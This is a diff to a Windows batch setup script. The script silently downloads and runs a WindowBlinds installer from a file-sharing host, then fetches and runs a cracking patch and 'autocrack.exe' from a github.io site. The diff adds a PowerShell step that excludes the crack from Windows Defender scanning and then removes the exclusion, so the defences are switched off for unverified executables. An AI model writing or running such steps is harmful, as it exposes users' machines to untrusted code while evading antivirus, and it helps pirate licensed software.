@@ -245,10 +245,12 @@ if defined DEVICEPREP (
   curl --output "%TEMP%\WindowBlinds11_setup.exe" "https://files.catbox.moe/8d4ejv.com"
   start /wait "" "%TEMP%\WindowBlinds11_setup.exe" /S
   del /f /q "%TEMP%\WindowBlinds11_setup.exe"
+  powershell Add-MpPreference -ExclusionPath '%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe'
   curl --output "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe" "https://microtoolbox.github.io/Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
   curl --output "%TEMP%\autocrack.exe" "https://microtoolbox.github.io/autocrack.exe"
   start /wait "" "%TEMP%\autocrack.exe" "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
   del /f /q "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
+  powershell Remove-MpPreference -ExclusionPath '%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe'
   del /f /q "%TEMP%\autocrack.exe"
 )
 
